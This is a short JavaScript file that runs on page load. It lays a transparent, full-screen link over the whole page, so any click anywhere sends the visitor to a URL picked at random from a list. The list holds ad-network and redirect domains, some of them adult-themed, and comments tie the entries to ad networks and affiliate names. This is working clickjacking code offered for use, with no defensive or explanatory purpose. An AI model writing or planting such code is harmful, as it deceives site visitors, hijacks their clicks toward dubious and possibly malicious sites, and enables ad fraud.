function createLink() {
  var urls = [
    // hil: "https://www.qrcreate.online",
    // "https://www.qrcreate.online",
    "https://tidy-status.com/BskeKo",
    // hil: db(ss)
    // "https://grim-package.com/b.3yVi0OPz3/pDvqblmoVxJWZ_DC0/1ZNhDOM/2KO/TacQ2HL/TiUO0JMmzLYw5-NizhcK",
    // hil: db(new)
    "https://tidy-status.com/bx3_V.0xPk3TpyvObym/V_JBZfDP0C2dMvD/Io0DNCjCYKzlL/TtYXwSMljLQ/2cNCjFQn",

    // hil: Thomas/Mary
    "https://superficial-sensitive.com/bX3IV.0UPE3_pxvFblmtVvJRZVDT0/1bOcD/Mr0WNzjDcAwtLIT/Uw4aMSz/QR2_NQzwEo",
    // hil: goodboy/Denis
    "https://happygolucky-officer.com/bS3.VL0zPs3dpwvCb/mfVYJkZAD/0X1wOSDhcWz/MEDjUGxYLdT_U/4PNgzrMOwkN/TkIk",

    // clickadilla: Lucy
    "https://hot123.top/tags/",
    // clickadilla: db123
    "https://sexylove.mjsj.sbs",
    // clickadilla: Brian
    "https://json.qrcreate.online",

    // mon: db
    // "https://laichegloavy.com/4/7631332",
    "https://vorsoutseemt.com/4/7436813",
    "https://eedootefaug.net/4/7420698",
    "https://futseerdoa.com/4/7237921",
    "https://eeboazurg.net/4/7420696",
    "https://psauwaun.com/4/7614690",
    // "https://ptougeegnep.net/4/7237907",
  ];

  if (urls.length === 0) {
    return;
  }
  var a = document.createElement('a');
  a.href = urls[Math.floor(Math.random() * urls.length)];
  a.rel = 'noopener noreferrer';
  a.style.cssText = 'position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999; opacity: 0;';
  document.body.appendChild(a);
}

document.addEventListener('DOMContentLoaded', createLink);